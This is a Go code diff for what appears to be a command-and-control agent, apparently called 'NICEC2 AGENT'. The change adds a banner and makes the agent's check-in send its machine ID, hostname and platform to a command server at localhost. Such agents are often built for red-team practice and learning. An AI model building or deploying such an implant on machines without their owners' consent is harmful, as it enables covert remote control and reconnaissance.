@@ -20,11 +20,24 @@ import (
 	// "github.com/mitchellh/go-homedir"
 )
 
+// Setting the command server
 // var command_server string = "http://192.168.0.69:8081"
-
 var command_server string = "http://localhost:8081"
 
+// Variables assigned later
 var NodeID string = "" // This will be a GUID at some point
+
+type CheckIn struct {
+	ID       string `json:"ID"`
+	Hostname string `json: "Hostname"`
+	Platform string `json:"Platform"`
+}
+
+type command struct {
+	ID      string `json:"ID"`
+	Command string `json:"command"`
+	Details string `json:"details"`
+}
 
 // Checking errors
 func check(e error) {
@@ -37,6 +50,18 @@ func check(e error) {
 var p = fmt.Println
 
 func main() {
+
+	Banner := `
+███████████████████████████████████████████████████████████████████████████████████████████████
+███    ██ ██  ██████ ███████  ██████ ██████       █████   ██████  ███████ ███    ██ ████████  
+████   ██ ██ ██      ██      ██           ██     ██   ██ ██       ██      ████   ██    ██    
+██ ██  ██ ██ ██      █████   ██       █████      ███████ ██   ███ █████   ██ ██  ██    ██    
+██  ██ ██ ██ ██      ██      ██      ██          ██   ██ ██    ██ ██      ██  ██ ██    ██    
+██   ████ ██  ██████ ███████  ██████ ███████     ██   ██  ██████  ███████ ██   ████    ██    
+███████████████████████████████████████████████████████████████████████████████████████████████                                                                                                                                                                                       
+`
+
+	fmt.Println(Banner)
 
 	NodeID, _ = machineid.ID()
 
@@ -85,19 +110,13 @@ func main() {
 
 }
 
-type CheckIn struct {
-	ID string `json:"ID"`
-}
-
-type command struct {
-	ID      string `json:"ID"`
-	Command string `json:"command"`
-	Details string `json:"details"`
-}
-
 func checkIn() {
 
-	data := map[string]string{"ID": NodeID}
+	// Getting the info
+	hostname, _ := os.Hostname()
+	platform := runtime.GOOS
+
+	data := map[string]string{"ID": NodeID, "Hostname": hostname, "Platform": platform}
 
 	json_data, err := json.Marshal(data)
 	if err != nil {
